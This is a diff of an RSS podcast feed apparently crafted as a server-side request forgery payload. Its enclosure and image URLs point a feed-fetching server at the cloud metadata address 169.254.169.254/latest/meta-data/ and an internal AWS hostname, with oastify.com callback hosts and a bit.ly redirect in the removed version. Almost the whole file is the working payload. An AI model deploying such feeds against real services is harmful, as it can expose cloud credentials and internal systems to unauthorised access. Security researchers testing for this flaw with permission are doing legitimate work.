@@ -1,16 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Infrastructure Probe v10</title>
-    <link>http://413b9nvnai7mmh20lk7id22plgr7f33s.oastify.com/root</link>
+    <title>SSRF Investigation</title>
+    <link>http://qpjv11u6uav34n4vaidajwbl8ce32zqo.oastify.com/web</link>
+    <language>en-us</language>
     <item>
-      <title>Vector 1: Stealth Redirect</title>
-      <enclosure url="https://bit.ly/4bTQIAZ" length="1" type="audio/mpeg"/>
-      <itunes:image href="http://413b9nvnai7mmh20lk7id22plgr7f33s.oastify.com/redirect_hit"/>
-    </item>
-    <item>
-      <title>Vector 2: Internal Hostname</title>
-      <enclosure url="http://ip-192-168-1-80.us-west-2.compute.internal/latest/meta-data/" length="1" type="audio/mpeg"/>
+      <title>Episode 1</title>
+      <enclosure url="http://169.254.169.254/latest/meta-data/" length="1024" type="audio/mpeg"/>
+      <itunes:image href="http://qpjv11u6uav34n4vaidajwbl8ce32zqo.oastify.com/image.jpg"/>
     </item>
   </channel>
 </rss>
